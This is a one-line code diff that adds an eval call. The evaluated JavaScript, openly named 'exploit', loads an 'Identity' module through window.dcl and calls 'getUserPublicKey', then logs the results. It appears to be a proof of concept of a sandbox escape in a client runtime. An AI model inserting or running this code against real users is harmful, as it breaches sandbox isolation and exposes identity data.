@@ -1,0 +1,1 @@
+eval("const exploit = async () => {let devt = await window.dcl.loadModule('Identity');console.log(devt);let response = await window.dcl.callRpc('Identity', 'getUserPublicKey');console.log(response);};exploit();")
